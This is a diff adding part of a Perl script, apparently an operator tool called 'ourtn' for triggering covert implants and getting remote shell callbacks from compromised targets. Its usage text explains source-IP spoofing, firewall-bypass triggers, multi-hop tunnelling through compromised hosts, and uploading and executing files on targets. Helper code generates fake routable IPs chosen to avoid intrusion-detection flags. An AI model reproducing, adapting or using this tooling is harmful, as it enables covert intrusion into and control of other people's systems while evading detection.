+           The -o option includes a check that the port is in the range
+           $minport-$maxport. See -O to override that range.
+-O port    Same as -o except -O will accept any positive port.
+-g         Do not have this NOPEN server prompt about calling back from
+           this hop before starting the autodone stuff (\"g\"o straight
+           there).
+-N         Do NOT automatically connect to rat listener just started.
+-S #       Have noserver sleep # seconds before calling back (def.=$noservercallbackdelaysecs).
+
+TRIGGER options:
+-3         INCISION should use ONLY ethernet interfaces for source IP (used
+           when both ppp* and eth* interfaces are live to force eth* only).
+-G IP      Regardless of what IP is found from tn.spayed, actually send the
+           trigger to this IP. Useful to send the trigger to ground with
+           127.0.0.1 in the event something else is sending/redirecting it.
+           NOTE: The NOPEN callback IP, if any, remains what it would have
+           been.
+-l         Do not spoof source IP on trigger (use local IP or with -irtun
+           use redirector IP).
+-D IP      Spoof this particular source IP for trigger. May fail if local
+           (or redirector's) ISP does not allow that source IP.
+-6         UNUSED
+-5 VER     Use \"tipoff-VER.X\" to trigger DD. For older 3.X, use -Y53 and for
+           newer 4.X, use -Y54. Requires -Y option to also be set. To use a 
+           tipoff version more specific than that, either use -J to point to a
+           specific binary, or use -Y5a.b.c.d, and as long as ../bin/tipoffs/
+           contains a binary matching that version, it should work.
+-J file    Use this file in $opbin instead of the tipoff determined by your
+           -Y5 option.
+           NOTE: Be sure you know what you are doing, thar be monsters there.
+-Y         DD: Uses tipoff to send the trigger (udp/tcp/icmp/???) to DD.
+           Defaults to triggering a random UDP port. See optional -y/-F
+           arguments, also. To use with the various DD triggers:
+
+                UDP trigger to random port    just -Y is needed
+                UDP trigger to specific port  add -y####
+                ICMP trigger                  add -sI (-y is ignored)
+                TCP trigger                   add -s### (tcp port ###)
+                Firewall aware TCP trigger    add -s### -F fwname
+                **Non-IP trigger              add -F\"-r proto\" (-y ignored)
+
+           ** The Non-IP triggers may not work. \"-r 50\" does (ipv6-crypt).
+              See /etc/protocols for more candidates.
+
+-y port    With -Y, when using DD's UDP trigger, use this port as the
+           trigger port instead of a random or the -p port provided.
+
+     NOTE: DD trigger ports are never munged--the -pPORT or -yPORT given is
+           where the trigger is sent.
+
+-F fw      Firewall type to bypass with -Y/tipoff trigger.$tipoff_fw_types
+   OR
+-F \"[fw] (other-tipoff-args-as-needed --even-several)\"
+           If the argument for -F, in quotes, contains other command line
+           arguments, they will be passed on to tipoff. Let's hope tipoff
+           knows what to do with them (see tipoff -h). Some examples that
+           use a full TCP session to trigger mid-session (other ourtn
+           arguments not shown, like -ue, -l, etc.):
+             ourtn -Ys25 -F\"-o\" target
+             ourtn -Ys25 -F\"pix -o -m me\@from.com -l you\@you.org\" target
+             -irtun target 38383 -Ys79 -F\"-o\"
+
+-R         Use a RE/ICMP trigger to get IN to call back instead of the
+           default IN udp trigger.
+-A #       Use ST to send a TCP trigger to port # to initiate an IN
+           callback (when target is behind a NAT firewall/router).
+-a         Use ST to send a TCP trigger to a random port to initiate an
+           IN callback (when target is behind a NAT firewall/router).
+-K [IP:]#  Use # as ST's command/control callback, Defaults to a random
+           port at penultimate IP (could be local ISP IP). Requires -a/A.
+           For the first/only hop, the default with -A|a|R triggers is to
+           use icmptime to get an accurate time offset (0 is used if that
+           fails). Use -Z## to disable icmptime attempt. For hops 2+, -Z
+           will often be necessary as icmptime is not yet automatically
+           used. The time window for -R trigger is only 5 min.
+
+-Z K#      Time window size in -Y5 mode, same format as -Z above.
+-Z #       Time offset, must be of the form [-][#h]#[m][#s]. Default mins.
+-z         Attempt to compute time offset using icmptime for IN
+           connections (default won't).
+-i IP      trigger shell callback to IP instead of trigger source IP. If
+           \"0.0.0.0\" is used, that means NO CALLBACK and instead the
+           target is triggered to listen. NOTE: Until new NOPEN comes out,
+           using -i 0.0.0.0 with -irtun requires a separate window to
+           manually tunnel the forward connection.
+-W IP:prt  Local net IP and port for trigger/NOPEN redirection (usually via
+           Windows boxes). Will also need -iWinExtIP, the far end of the
+           redirection tunnel. If using NOPEN callback, will also need
+           -CWinExtIP. If calling forward to NOPEN server, the noclient
+           connection exec'd by $prog will be to the IP given to -W, the
+           local IP of redirector. Be sure that tunnel is there.
+-7 IP[,IP2[,...]]
+           Tunnel IN connection through one or more IPs to final target.
+           These tunnel IPs are triggered via udp. The final leg's trigger
+           can be udp or tcp (IN only). The udp ports used (derived from
+           their corresponding ish callback ports) are random unless -p is
+           used. If the -p argument is multiple comma delimited ports, they
+           are used for the udp INCISION trigger/tunnels, closest first.
+    NOTE:
+           -7 can be used with -ue[cC] to run NOPEN on final target in
+           callback mode, but NOPEN callback will not come back via these
+           IPs. Rather, the final target calls directly to this machine
+           (with -c) or to the -C IP target. If there is such an outbound
+           route from the final target, NOPEN callback will work fine.
+           Similarly, a NOPEN listener could be started on the final target
+           this way, but if we have to trigger in this manner, can we call
+           forward directly to the final target?
+-p port    shell callback port (for ish/IN, ish/DD trigger).  With IN, this
+           is also munged to determine the UDP trigger dest port. E.g.,
+           -p17325 munges to 53, so target receives trigger on udp/53. See
+           also \"tnmunger -h\" and -y above.
+-p p1,p2[...]
+           Used with -7 to indicate the udp callback ports to be used for
+           the IN tunneling.
+-s #       Use TCP trigger to this port (IN/DD), or use \"-s rand\" to
+           have ourtn pick a random port.
+-s [?]     Use this type of trigger (VA/DD/IN):
+            -sJ      use IN ICMP destination/port unreachable packet
+            -sy      use IN ICMP echo request packet with DNS payload
+            -sY      use IN ICMP echo request packet with ICMP payload
+            -s[V]I   use DD ICMP echo request trigger (via tipoff/-Y)
+            -s[V]p   use DD ICMP echo reply trigger (via tipoff/-Y)
+            -s[V]P   use DD ICMP port unreachable trigger (via tipoff/-Y)
+            -s#,#    use DD ICMP type #,# (via tipoff/-Y)
+            -sV#     use DD TCP port # to trigger VA implant (or use \"rand\"
+                     to have ourtn pick a random port.
+
+             NOTE: OPTIONAL V indicates use of VA rather than older IN
+                   implant, which changes upload capabilities, for one,
+                   eliminating the need for an ftshell wrapper.
+
+             NOTE: -F can be used to send other ICMP code/type combinations
+                   to tipoff if -s[V]I is also used. See tipoff --help or
+                   tipoff --list-icmp-options.
+
+  NOTE: As of ourtn v4.52, the -s option does some new things.
+        Using \"-s ##\" still behaves as it always has, however.
+
+";
+$usagetextlong="$prog requires a tn.spayed in one of ./ ./tnstuff/ ../bin/ or
+$opbin (or you may point to your key file with -k option). The
+IP(s)/name(s) on $prog's command line are grepped in tn.spayed. If one target
+is given, and there is more than one match, you choose which. If more than
+one target is on the command line, each must be a unique match. User is
+shown all matches if one of the multiple targets is not unique.
+
+If -R|A|a (RE-ICMP|ST trigger) is NOT being used, and once the target(s)
+is(are) found in tn.spayed, the environment variable \"keys\" is set
+accordingly, and tn.spayed is called (unless \"-d\" is used). Then tn.spayed
+uses \$keys to connect to the first target.
+
+If -R|A|a (ICMP|ST trigger) IS being used, $opbin/varkeys must exist
+and contain the RE|ST key for that target. In this case, the tn.spayed file
+keys are ignored, but tn.spayed is still required to contain an entry for
+that target. You get the varkeys directory populated by selecting \"access\"
+for at least one implant when building with Sybil.
+
+Multiple targets can be given on the command line or in a hopsfile. The
+first file (alphabetically) of the form \"hops.txt*\" in $opetc is used
+as the hopsfile (unless -t is used). If multiple targets are given, -ue
+flags must be used. A target on the command line overrides any hopsfile.
+
+HOPSFILE SYNTAX $opetc/hops.txt
+
+Each line indicates another hop to connect to automatically, from the
+previous hop, via IN, to upload and execute and then connect to/from
+that newly executed NOPEN. Any hop may use the -c callback method. To call
+back to a NOPEN other than the previous one, -C may be used, BUT ONLY ON
+THE FINAL hop in the hopsfile. Lines beginning with \"#\" and empty lines
+are ignored.  Example hops file:
+
+HOP1: host-or-ip1:R -ue
+HOP2: host-or-ip2:R -ueR
+...etc...
+
+In the above, the final part of each line contains ourtn options, and $prog
+confirms that each host-or-ip# is a unique match for that host in tn.spayed
+before proceeding. The \":R\" indicates to use a random NOPEN port (callback
+or listen) on that hop. To specify which port to use replace the \":R\" with
+\":#\" (# must be between 10025 and 65534 (or, equivalently, use \"-o|O #\" as
+part of your ourtn options).
+
+Unless -f is used or $prog itself was already wrapped by ftshell, or a VA
+trigger capability is used, $prog ensures that your connection has an ftshell wrapper.
+
+Unless -e is given, $prog pops up a fresh xterm with pastables for use
+either here or at the far end. A ^C kills this pop-up window, but to see
+the latest version of such, run $opbin/useful in any window. Also,
+every target acquired via ourtn is logged into $opdown/didthis in
+pastable format (you need to know what gets pasted where for callbacks).
+
+Finally, to only upload a file and not maintain your session, use:
+
+[A=\"commands\"] $prog -U file -r destname -w destdir
+
+  This will put file into destir, calling it destname on target, and
+  where \"commands\" are any commands you want to execute after the
+  upload, e.g., chmod or chown.
+
+";
+  $scriptoverride = $ENV{SCRIPTOVERRIDE} ;
+
+} #myinit
+
+sub kludgeishport {
+  # stupid kludge to change our ethereal port a few times
+  # default first one messes up ish callback if it is to 32768
+  # which is iptables filtered and/or listening (kde)
+  my $times = 5 ;
+  my $port = 31337 ; # :D  Set these in case mkrandom is not available
+  if ( `which mkrandom 2>/dev/null` ) {
+    chomp($times = `mkrandom -n 3 10`) ;
+    while ($port == 31337 or $port == 32768 or
+	   `iptables -L -n -v 2>&1 | grep $port` or
+	   `netstat -an | grep $port.*LISTEN`) {
+      chomp($port = `mkrandom -n 59000 59876`) ;
+    }
+  }
+  `nc -w1 127.0.0.1 $port 2>/dev/null` while ($times--) ;
+} # kludgeishport
+
+sub forkit {
+  my $kidpid = fork ;
+  push (@kidpids,$kidpid);
+  return $kidpid;
+}#forkit
+
+sub gmtnow {
+  my $epochtime = Time::Local::timegm(gmtime) ;
+  my ($sec,$min,$hr,$mday,$monnum,$year) = 
+    gmtime($epochtime);
+  return sprintf("%ds=%s %02d %02d:%02d:%02d",$epochtime,
+		 $monstr{$monnum},$mday,$hr,$min,$sec );
+}
+
+sub fakeip {
+  my $ip = "" ;
+  while (!isrouteable($ip)) {
+    $ip="";
+    for ($i=0 ; $i<4 ; $i++) {
+      $ip .= myrand(1,254).".";
+    }
+    chop($ip); # extra dot
+    last if isrouteable($ip);
+  }
+  return $ip;
+}
+
+sub isrouteable {
+  # returns true if valid dotted octet IP (FOUR octets)
+  # and that IP is deemed "routeable".
+  # Also (since we can), reject it if it already appears in tn.spayed
+  use Socket;
+
+  local($ip,$nolookup) = (@_);
+
+  local $addr = inet_aton($ip);
+
+  local @ip = $ip =~ /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/ ;
+  return 0 unless @ip == 4;
+  #   Some IDS flag any 0's or 255's
+  foreach (@ip) {
+    return 0 if ($_ <= 0 or $_ >= 255) ;
+  }
+
+  #   Look for private network numbers RFC-1597.  
+  return 0 if ($ip[0] == 10);	# 10.0.0.0 - 10.255.255.255
+
+  return 0 if (($ip[0] == 172) && # 172.16.0.0 - 172.31.255.255
+	       (($ip[1] >= 16) && ($ip[1] <32)));
+
+  return 0 if (($ip[0] == 192) && # 192.168.0.0 - 192.168.255.255
+	       ($ip[1] == 168));
+
+  return 0 if ($ip[0] == 127);	#  127.0.0.0 - 127.255.255.255
+
+  chomp(my $intn = `grep $ip $opbin/tn.spayed 2>/dev/null`);
+  return 0 if $intn ;
+
+  return 1 if $nolookup;
+  ($name,$aliases,$addrtype,$length,@addrs) = gethostbyaddr($addr,AF_INET);
+
+  return 1 ;
+}
+
+sub swapips {
+  local ($string,$ip1,$ip2) = (@_) ;
+  my $origstring = $string ;
+  # swap $ip2 for second instance $ip1 in $string, but not if in $debug mode
+  # First instance (the keys= part) stays the same, letting the right key from
+  # $spayedfile be used.
+  return $string unless (!$debug and $ip1 and $ip2 and !($ip1 eq $ip2)) ;
+  # return $string with second $ip1 replaced with $ip2
+  $ip1 =~ s/\./\\./g ;
+  $string =~ s/(keys=.*$ip1.*)$ip1/\1$ip2/g ;
+  unless ($string eq $origstring) {
+    progprint("Due to -G option, changing target $ip1 to $ip2 in this command:\n\n$origstring\n\n(see below)\n\n",STDOUT);
+#    my ($tnkey) = $string =~ /keys=(\S+)/;
+#    if ($tnkey) {
+#      my $tnmatch = `grep $tnkey.*\{ $spayedfile 2>/dev/null`;
+#      unless ($tnmatch =~ /^\s*[^\#]/) {
+#	unless ($tipofftrigger) {
+#	  if ($key{$ip1} and $keybits{$ip1} ) {
+##	    $string =~ s/keys=$tnkey/TARG_AYT=\"$keybits{$ip1}\" keys=$tnkey
+#	  }
+#	  mywarn("\n\nNOTE: THIS WILL LIKELY FAIL since the keys= value is not in $spayedfile\n\n");
+#	  sleep 1;
+#	  mywarn("\n\nNOTE: THIS WILL LIKELY FAIL since the keys= value is not in $spayedfile\n\n");
+#	  sleep 1;
+#	  unless ($nointeraction # or $inlab
+#		 ) {
+#	    my $ans = getinput("\n\nNOTE: THIS WILL LIKELY FAIL since the keys= value is not in $spayedfile\n\n".
+#			       "Continue, or Abort?","C","A");
+#	    mymydie("ABORTED BY USER")
+#	      if ($ans =~ /^a/i);
+#	  }
+#	}
+#      }
+#    }
+  }
+  return $string;
+}
+
+sub oldscriptordie {
+  if (-x "$opbin/scriptcheck" and !(-x "/usr/local/bin/scriptcheck")) {
+    unlink("/usr/local/bin/pschain","/usr/local/bin/scriptcheck");
+    copy("$opbin/pschain","/usr/local/bin/pschain");
+    chmod 0755,"/usr/local/bin/pschain";
+    symlink("pschain","/usr/local/bin/scriptcheck");
+  }
+  chomp(my $scriptordie =  `/usr/local/bin/scriptcheck 2>/dev/null`) ;
+  if ($scriptordie) {
+    progprint("Confirmed this window is scripted:\n$scriptordie",STDOUT);
+  } else {
+    my $processes = `pschain $$ | egrep -v "perl|grep"` ;
+    unless ($scriptoverride) {
+      progprint("\aYou must run $prog in a scripted window.\n\nI.e., some ancestor process must match \"scripme.pl|script .*script\" and does not:$COLOR_NOTE\n$processes\n",STDOUT);
+      if ($inlab) {
+	mywarn("Never mind...we're in lab we can proceed.");
+	sleep 1 ;
+      } else {
+	mymydie();
+      }
+    } else {
+      progprint("WARNING: Overriding requirement for \"script -af\" in this window.
+
+     That is there to protect you. If you continue unscripted, it's your problem.
+     $prog will proceed in 2 seconds.
+",$COLOR_FAILURE,STDOUT);
+      sleep 2 unless ($inlab) ;
+    }
+  }
+  return $scriptordie ;
+}#scriptordie
